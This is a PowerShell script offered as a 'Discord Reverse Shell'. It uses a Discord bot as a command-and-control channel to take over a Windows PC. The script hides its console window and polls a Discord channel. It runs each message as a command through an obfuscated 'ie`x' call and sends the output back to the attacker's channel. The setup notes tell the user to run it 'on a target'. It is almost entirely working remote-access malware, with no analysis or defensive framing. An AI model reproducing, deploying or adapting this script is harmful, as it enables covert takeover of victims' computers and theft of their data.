
<# ============================================= Beigeworm's Discord Reverse Shell ========================================================

**SYNOPSIS**
Using a Discord bot along with discords API to Act as a Powershell Terminal.

INFORMATION
This script uses a discord bot along with discords API to control a windows pc via powershell.
Every 10 seconds it will check for a new message in chat and interpret it as a Powershell command.

SETUP
1. make a discord bot at https://discord.com/developers/applications/
2. add the bot to your discord server (with intents enabled and messaging and file upload permissions)
4. Change $tk below with your bot token
5. Change $ch below to the channel id of your webhook.

USAGE
1. Setup the script
2. Run the script on a target.
3. Check discord for 'waiting to connect..' message.
4. Enter the computername to authenticate the session.
5. Enter commands to interact with the target.

#>


# ================================================================ Discord C2 ======================================================================

$token = "$tk" # make sure your bot is in the same server as the webhook
$chan = "$ch" # make sure the bot AND webhook can access this channel

# =============================================================== SCRIPT SETUP =========================================================================

$response = $null
$previouscmd = $null
$authenticated = 0
$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running

function PullMsg {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)
    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
    
    if ($response) {
        $most_recent_message = ($response | ConvertFrom-Json)[0]
        if (-not $most_recent_message.author.bot) {
            $response = $most_recent_message.content
            $script:response = $response
            $script:messages = $response
        }
    } else {
        Write-Output "No messages found in the channel."
    }
}


function sendMsg {
    param([string]$Message)
    $dir = $PWD.Path
    $url = "https://discord.com/api/v9/channels/$chan/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$dir"
            } | ConvertTo-Json
            $webClient.Headers.Add("Content-Type", "application/json")
            $response = $webClient.UploadString($url, "POST", $jsonBody)
            Write-Host "Message sent to Discord"
        }
    }


Function HideConsole{
    If ($HideWindow -gt 0){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if($hwnd -ne [System.IntPtr]::Zero){
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else{
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    }
}

Function Authenticate{
    if ($response -like "$env:COMPUTERNAME"){
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg -Message ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
        sendMsg -Message "``PS | $dir>``"
    }
    else{
        $script:authenticated = 0
        $script:previouscmd = $response
    } 
}

# =============================================================== MAIN LOOP =========================================================================

HideConsole
PullMsg
$previouscmd = $response
sendMsg -Message ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"

while ($true) {
    PullMsg
    if (!($response -like "$previouscmd")) {
        $dir = $PWD.Path
        Write-Output "Command found!"
        if ($authenticated -eq 1) {
            if ($response -like "close") {
                $previouscmd = $response        
                sendMsg -Message ":octagonal_sign:  **$env:COMPUTERNAME** | ``Session Closed.``  :octagonal_sign:"
                break
            }
            if ($response -like "Pause") {
                $script:authenticated = 0
                $previouscmd = $response
                sendMsg -Message ":pause_button:  **$env:COMPUTERNAME** | ``Session Paused..``  :pause_button:"
                sleep -m 250
                sendMsg -Message ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
            }
            elseif (!($response -like "$previouscmd")) {
                $Result = ie`x($response) -ErrorAction Stop
                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")) {
                    $script:previouscmd = $response
                    sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                    sleep -m 250
                    sendMsg -Message "``PS | $dir>``"
                }
                else {
                    $script:previouscmd = $response
                    $resultLines = $Result -split "`n"
                    $maxBatchSize = 1900
                    $currentBatchSize = 0
                    $batch = @()
                    foreach ($line in $resultLines) {
                        $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
                        if (($currentBatchSize + $lineSize) -gt $maxBatchSize) {
                            sendMsg -Message "``````$($batch -join "`n")``````"
                            sleep -m 400
                            $currentBatchSize = 0
                            $batch = @()
                        }
                        $batch += $line
                        $currentBatchSize += $lineSize
                    }
                    if ($batch.Count -gt 0) {
                        sendMsg -Message "``````$($batch -join "`n")``````"
                        sleep -m 250
                    }
                    sendMsg -Message "``PS | $dir>``"
                }
            }
        } else {
            Authenticate
        }
    }
    sleep 5
}